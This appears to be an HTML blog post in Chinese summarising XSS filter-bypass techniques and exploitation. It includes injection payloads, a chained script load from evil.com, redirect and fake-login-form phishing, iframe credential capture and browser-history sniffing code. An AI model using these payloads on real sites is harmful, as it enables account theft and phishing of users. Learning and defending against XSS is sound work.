@@ -1,0 +1,535 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>XSS绕过和利用方式总结 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XSS绕过和利用方式总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-04-24 22:02" pubdate>
+        2018年4月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      27
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS绕过和利用方式总结</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p>
+<h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p>
+<ul>
+<li>1 大小写混用</li>
+</ul>
+<p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScRipt</span>&gt;</span><span class="javascript">AleRt(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRipt</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>2 利用HTML标签属性值执行</li>
+</ul>
+<p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;table <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;jacascript:alert(/xss/)&quot;</span>&gt;&lt;/table&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>3 回车空格等</li>
+</ul>
+<p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javas cript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+<p>或者换行输入用分号分隔：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&lt;img src=<span class="hljs-string">&quot;javas</span><br>cript:<br>alert(&#x27;xss&#x27;);<span class="hljs-string">&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>4 对标签属性进行转码</li>
+</ul>
+<p>普通的标签属性值过滤还可以通过编码绕过，如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+<p>可以写成：</p>
+<figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cal">&lt;img src=&amp;<span class="hljs-string">#106</span>;&amp;<span class="hljs-string">#97</span>;&amp;<span class="hljs-string">#118</span>;&amp;<span class="hljs-string">#97</span>;&amp;<span class="hljs-string">#115</span>;&amp;<span class="hljs-string">#99</span>;&amp;<span class="hljs-string">#114</span>;&amp;<span class="hljs-string">#105</span>;&amp;<span class="hljs-string">#112</span>;&amp;<span class="hljs-string">#116</span>;&amp;<span class="hljs-string">#58</span>;&amp;<span class="hljs-string">#97</span>;&amp;<span class="hljs-string">#108</span>;&amp;<span class="hljs-string">#101</span>;&amp;<span class="hljs-string">#114</span>;&amp;<span class="hljs-string">#116</span>;&amp;<span class="hljs-string">#40</span>;&amp;<span class="hljs-string">#39</span>;&amp;<span class="hljs-string">#120</span>;&amp;<span class="hljs-string">#115</span>;&amp;<span class="hljs-string">#115</span>;&amp;<span class="hljs-string">#39</span>;&amp;<span class="hljs-string">#41</span>;&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>5 自己构造事件</li>
+</ul>
+<p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onerror</span>=alert(&#x27;xss&#x27;) &gt;<br></code></pre></td></tr></table></figure>
+<p>图片地址不存在，加载失败的时候就会运行后面的脚本</p>
+<p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p>
+<ul>
+<li>6 注释过滤</li>
+</ul>
+<p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;xss:expr/*xss*/ession(alert(&#x27;xss&#x27;))&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>7 拆分跨站</li>
+</ul>
+<p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">document.write(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.evil.com/hack.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;)<br></code></pre></td></tr></table></figure>
+<p>但是输入框限制每次只能输入30个字符时，我们可以：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=<span class="hljs-string">&#x27;document.&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;write(&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;&lt;script&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;src=htt&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;p://www&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;.evil.c&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;om/hack&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;.js&gt;&lt;/s&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;cript&gt;&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;eval(z)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p>
+<h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p>
+<h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p>
+<ul>
+<li>xss重定向钓鱼</li>
+</ul>
+<p>我们在一个网页找到了xss漏洞：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.123.com/index.php?input=</span>[<span class="hljs-string">Expliot</span>]<br></code></pre></td></tr></table></figure>
+<p>构造如下代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.123.com/index.php?input=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location.href=<span class="hljs-string">&quot;http://www.hack.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就可以通过xss重定向，将网页跳转到<a target="_blank" rel="noopener" href="http://www.hack.com/">www.hack.com</a></p>
+<ul>
+<li>HTML注入式钓鱼</li>
+</ul>
+<p>仍然假设有如下漏洞页面</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.123.com/index.php?input=</span>[<span class="hljs-string">Expliot</span>]<br></code></pre></td></tr></table></figure>
+<p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.hack.com/index.php?input=&quot;&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center;&quot;</span>&gt;</span>&lt;form<br>Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>Login:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Valid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Ok&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p>
+<ul>
+<li>iframe钓鱼</li>
+</ul>
+<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css">      <span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">	  <span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">	  <span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;</span><br>  &#125;<br><span class="css"><span class="hljs-selector-tag">iframe</span>&#123;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframepage&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframepage&quot;</span>  <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这样我们可以用百度页面覆盖整个网页。</p>
+<p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的<a target="_blank" rel="noopener" href="http://www.hack.com搭建好完全和对方相同的网页,并且在后台写好接收保存账号密码的php文件,然后将style和iframe写在xss中/">www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;style&gt;body&#123;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;<span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;&#125;<br>iframe&#123;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;&#125;<br>&lt;<span class="hljs-selector-tag">iframe</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://www.hack.com/&quot;</span>width=<span class="hljs-string">&quot;100%&quot;</span> height=<span class="hljs-string">&quot;100%&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+<p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p>
+<h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。</p>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs qml">&lt; script &gt;<br><span class="hljs-keyword">var</span> websites = [要检测的访问过的网址列表（自己补充）];<br><span class="hljs-comment">//遍历每个URL</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-attribute">websites.length</span>: i++) &#123;<br>    <span class="hljs-keyword">var</span> link = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;a&quot;</span>);<br>    link.id = <span class="hljs-string">&quot;id&quot;</span> + i;<br>    link.href = websites[i];<br>    link.innerHTML = websites[i];<br>    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;style&gt;&#x27;</span>);<br>    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;#id&#x27;</span> + i + <span class="hljs-string">&quot;:visited &#123;color:#FF0000;&#125;&quot;</span>);<br>    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;/style&gt;&#x27;</span>);<br>    <span class="hljs-built_in">document</span>.body.appendChild(link);<br>    <span class="hljs-keyword">var</span> <span class="hljs-built_in">color</span> = <span class="hljs-built_in">document</span>.defaultView.getComputedStyle(link, <span class="hljs-literal">null</span>).getPropertyValue(<span class="hljs-string">&quot;color&quot;</span>);<br>    <span class="hljs-built_in">document</span>.body.removeChild(link);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">color</span> == <span class="hljs-string">&quot;rgb(255,0,0)&quot;</span>) &#123; <span class="hljs-comment">//visited</span><br>        <span class="hljs-keyword">var</span> item = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;li&#x27;</span>);<br>        item.appendChild(link);<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;visited&#x27;</span>).appendChild(item);<br>    &#125; <span class="hljs-title">else</span> &#123; <span class="hljs-comment">//Not visited</span><br>        <span class="hljs-keyword">var</span> item = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;li&#x27;</span>);<br>        item.appendChild(link);<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;notvisited&#x27;</span>).appendChild(item);<br>    &#125;<br>&#125; &lt; <span class="hljs-regexp">/script&gt;/</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p>
+<h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件包含漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/04/23/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">
+                        <span class="hidden-mobile">SSRF服务端请求伪造</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
